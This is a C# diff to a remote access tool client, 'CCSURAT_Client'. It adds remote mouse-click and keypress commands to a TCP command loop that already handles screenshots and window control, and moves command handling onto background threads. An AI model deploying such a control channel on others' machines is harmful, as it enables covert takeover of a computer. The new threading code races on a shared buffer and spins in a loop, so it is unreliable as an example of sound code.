@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
+using System.Collections.Generic;
 
 namespace CCSURAT_Client
 {
@@ -22,6 +23,7 @@ namespace CCSURAT_Client
         private TcpClient client;
         private NetworkStream netStream;
         private string curData;
+        private Queue<string> commandQueue;
 
         private string status;
         private Boolean isConnected;
@@ -58,6 +60,9 @@ namespace CCSURAT_Client
             pingTimer = new System.Timers.Timer();
             pingTimer.Elapsed += (sender, e) => Ping(sender, e, this);
             remoteDesktop = new RemoteDesktop();
+
+            // initialize command queue
+            commandQueue = new Queue<string>();
         }
 
         public void Start()
@@ -79,9 +84,6 @@ namespace CCSURAT_Client
                         status = "Connected.";
                         Log("Connection successful!");
 
-                        //Thread cmdListenThread = new Thread(ListenToCommands);
-                        //cmdListenThread.SetApartmentState(ApartmentState.STA);
-                        //cmdListenThread.Start();
                         ListenToCommands();
                         Log("Listening to commands.");
                     }
@@ -104,7 +106,7 @@ namespace CCSURAT_Client
             netStream = client.GetStream();
             try
             {
-                while (netStream.CanRead && IsAlive())
+                while (netStream.CanRead && IsAlive() && IsSocketConnected(client.Client))
                 {
                     byte[] bytes = new byte[1024];
                     string data = null;
@@ -113,7 +115,10 @@ namespace CCSURAT_Client
                     {
                         // convert data bytes to string
                         data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+
                         curData += data;
+                        if (data.Contains("[[REFRESH]]"))
+                            curData = "";
                         if (!data.Contains("SCREENSHOT"))
                             Log("Data recieved: " + data);
                         // If we are receiving binary data, place data into buffer.
@@ -128,9 +133,10 @@ namespace CCSURAT_Client
                             }
                             catch { }
                         }
-                        // Handles the first command.
-                        if (FirstCommandIsClosed(curData))
-                            HandleData(FirstCommand());
+
+                        // Handle all current data on a seperate thread so that we can continue listening to data
+                        Thread handleDataThread = new Thread(handleCurrentData);
+                        handleDataThread.Start();
                     }
                     Thread.Sleep(1);
                 }
@@ -147,7 +153,21 @@ namespace CCSURAT_Client
             }
         }
 
+        // Goes throught the current data buffer and starts a background thread to handle every command.
+        private void handleCurrentData()
+        {
+            while (curData.Length > 0 && FirstCommandIsClosed(curData))
+            {
+                if (FirstCommandIsClosed(curData))
+                {
+                    Thread test = new Thread(new ParameterizedThreadStart(HandleData));
+                    test.Start(FirstCommand());
+                }
+            }
+        }
+
         // checks if the server is still up and connection is stable
+        // does not seem to work most of the time.
         private Boolean IsAlive()
         {
             try
@@ -169,8 +189,21 @@ namespace CCSURAT_Client
             }
         }
 
-        private void HandleData(string data)
+        // Checks if the TCP socket is currently connected. 
+        // Seems to work VERY well and may no longer need an IsAlive() method
+        public static bool IsSocketConnected(Socket socket)
         {
+            try
+            {
+                return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
+            }
+            catch (SocketException) { return false; }
+        }
+
+        // Handle the data according to command
+        private void HandleData(object d)
+        {
+            string data = (string)d;
             try {
                 string command = GetCommand(data);
                 data = RemoveCommand(data);
@@ -223,6 +256,12 @@ namespace CCSURAT_Client
                     case "WINDOW":
                         for(int i = 0; i < prms.Length-2; i += 2)
                             SystemUtils.ChangeWindowView(prms[i], prms[i+1]);
+                        break;
+                    case "MOUSECLICK":
+                        remoteDesktop.MouseClick(Convert.ToInt64(prms[0]), Convert.ToInt64(prms[1]), prms[2]);
+                        break;
+                    case "KEYPRESS":
+                        remoteDesktop.KeyPress(data);
                         break;
                 }
             } catch(Exception ex)
